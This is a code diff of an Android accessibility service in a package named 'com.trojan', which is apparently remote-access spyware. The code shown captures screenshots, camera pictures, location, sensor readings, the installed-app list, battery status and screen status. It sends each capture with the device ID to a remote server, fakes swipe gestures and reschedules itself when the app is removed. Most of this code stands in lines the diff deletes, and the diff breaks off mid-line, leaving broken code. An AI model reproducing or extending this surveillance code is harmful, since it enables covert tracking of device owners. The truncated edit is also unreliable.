@@ -1,3 +1,5 @@
+// FILE: app/src/main/java/com/trojan/PowerAccessibilityService.java
+
 package com.trojan;
 
 import android.accessibilityservice.AccessibilityService;
@@ -133,7 +135,6 @@ public class PowerAccessibilityService extends AccessibilityService implements S
                 case ACTION_TRIGGER_GET_LOCATION: getCurrentLocation(); break;
                 case ACTION_TRIGGER_GET_SENSORS: getSensorData(); break;
                 case ACTION_TAKE_SCREENSHOT:
-                    // THE ONLY CHANGE IS HERE: START THE ACTIVITY INSTEAD OF DOING IT DIRECTLY
                     Log.i(TAG, "Triggering ScreenshotActivity to handle screen capture.");
                     Intent screenshotIntent = new Intent(context, ScreenshotActivity.class);
                     screenshotIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
@@ -152,25 +153,19 @@ public class PowerAccessibilityService extends AccessibilityService implements S
         }
     }
 
-    // --- NO MORE takeScreenshot or captureScreenAndUpload method is needed here. It has been moved. ---
-
-    // The rest of your file is completely unchanged.
     @SuppressLint("WakelockTimeout")
     private void wakeUpAndSwipe() {
         PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
         if (pm != null) {
             PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "trojan::WakeLock");
-            wakeLock.acquire(5000L); // acquire with timeout
-            wakeLock.release();
+            wakeLock.acquire(5000L);
         }
         new Handler(Looper.getMainLooper()).postDelayed(() -> {
             DisplayMetrics displayMetrics = getResources().getDisplayMetrics();
             Path swipePath = new Path();
             swipePath.moveTo(displayMetrics.widthPixels / 2f, displayMetrics.heightPixels * 0.8f);
             swipePath.lineTo(displayMetrics.widthPixels / 2f, displayMetrics.heightPixels * 0.2f);
-            GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
-            gestureBuilder.addStroke(new GestureDescription.StrokeDescription(swipePath, 0, 400));
-            dispatchGesture(gestureBuilder.build(), null, null);
+            dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(swipePath, 0, 400)).build(), null, null);
         }, 500);
     }
     private void takePicture(int cameraId) {
@@ -220,11 +215,8 @@ public class PowerAccessibilityService extends AccessibilityService implements S
             postData.put("deviceId", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
             postData.put("dataType", dataType);
             postData.put("fileData", base64Data);
-        } catch (JSONException e) {return;}
-        JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, url, postData,
-            response -> {}, error -> {});
-        request.setRetryPolicy(new com.android.volley.DefaultRetryPolicy(30000, 1, 1.0f));
-        requestQueue.add(request);
+            requestQueue.add(new JsonObjectRequest(Request.Method.POST, url, postData, r -> {}, e -> {}));
+        } catch (JSONException e) {}
     }
     private void playSound(String url) {
         if(url==null||url.isEmpty())return;
@@ -266,102 +258,4 @@ public class PowerAccessibilityService extends AccessibilityService implements S
             List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
             JSONObject appMap = new JSONObject();
             for (ApplicationInfo app : apps) {
-                if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
-                    appMap.put(app.packageName, app.loadLabel(pm).toString());
-                }
-            }
-            submitDataToServer("installed_apps", appMap);
-        } catch (Exception e) {}
-    }
-    @SuppressLint("MissingPermission")
-    private void getCurrentLocation() {
-        try {
-            fusedLocationClient.getLastLocation().addOnSuccessListener(location -> {
-                try {
-                    if(location!=null) submitDataToServer("location", new JSONObject().put("latitude",location.getLatitude()).put("longitude",location.getLongitude()));
-                    else submitDataToServer("location", "Not available");
-                } catch (Exception e) {}
-            });
-        } catch (SecurityException e) {}
-    }
-    private void getSensorData() {
-        registerSensorIfAvailable(Sensor.TYPE_ROTATION_VECTOR, "rotation_vector");
-    }
-    private void registerSensorIfAvailable(int sensorType, String dataType) {
-        try {
-            if (sensorManager!=null) {
-                Sensor sensor = sensorManager.getDefaultSensor(sensorType);
-                if (sensor != null) sensorManager.registerListener(this, sensor, SensorManager.SENSOR_DELAY_NORMAL);
-                else submitDataToServer(dataType, "Not available");
-            }
-        } catch (Exception e) {}
-    }
-    @Override
-    public final void onSensorChanged(SensorEvent event) {
-        try {
-            int type = event.sensor.getType();
-            if (type == Sensor.TYPE_ROTATION_VECTOR) {
-                JSONObject data = new JSONObject();
-                data.put("x",event.values[0]); data.put("y",event.values[1]);
-                data.put("z",event.values[2]); data.put("w",event.values[3]);
-                submitDataToServer("rotation_vector", data);
-            }
-        } catch (Exception e) {}
-        finally {sensorManager.unregisterListener(this, event.sensor);}
-    }
-    private void submitDataToServer(String dataType, Object payload) {
-        try {
-            JSONObject postData = new JSONObject();
-            postData.put("deviceId", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
-            postData.put("dataType", dataType);
-            postData.put("payload", payload);
-            requestQueue.add(new JsonObjectRequest(Request.Method.POST, SUBMIT_DATA_URL, postData, r -> {}, e -> {}));
-        } catch (Exception e) {}
-    }
-    private void getBatteryStatus() {
-        Intent batteryStatus = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
-        try {
-            if(batteryStatus!=null){
-                int level=batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
-                int scale=batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
-                float pct = level*100/(float)scale;
-                int status=batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
-                boolean isCharging = status==BatteryManager.BATTERY_STATUS_CHARGING||status==BatteryManager.BATTERY_STATUS_FULL;
-                submitDataToServer("battery_status", new JSONObject().put("percentage",pct).put("isCharging",isCharging));
-            }
-        } catch (Exception e) {}
-    }
-    private void getScreenStatus() {
-        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-        if (pm != null) submitDataToServer("screen_status", pm.isInteractive()?"On":"Off");
-    }
-    private void openSettingsPanel(String settingsAction) {
-        startActivity(new Intent(settingsAction).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
-    }
-    private void openApp(String packageName) {
-        if (packageName!=null&&!packageName.isEmpty()) {
-            Intent launchIntent = getPackageManager().getLaunchIntentForPackage(packageName);
-            if (launchIntent != null) startActivity(launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
-        }
-    }
-    @Override public void onAccuracyChanged(Sensor sensor, int accuracy) {}
-    @Override public void onAccessibilityEvent(AccessibilityEvent event) {
-        if (event.getEventType()==AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && event.getPackageName()!=null) {
-            lastForegroundAppPkg=event.getPackageName().toString();
-        }
-    }
-    @Override public void onInterrupt() {}
-    @Override public boolean onUnbind(Intent intent) {
-        if(powerActionReceiver!=null)unregisterReceiver(powerActionReceiver);
-        if(sensorManager!=null)sensorManager.unregisterListener(this);
-        return super.onUnbind(intent);
-    }
-    @Override public void onTaskRemoved(Intent rootIntent) {
-        AlarmManager alarmService = (AlarmManager)getSystemService(Context.ALARM_SERVICE);
-        if (alarmService != null) {
-            PendingIntent pi = PendingIntent.getService(this, 1, new Intent(this, getClass()).setPackage(getPackageName()), PendingIntent.FLAG_ONE_SHOT|PendingIntent.FLAG_IMMUTABLE);
-            alarmService.set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime()+1000, pi);
-        }
-        super.onTaskRemoved(rootIntent);
-    }
-}
+                if ((app.flags & ApplicationInf
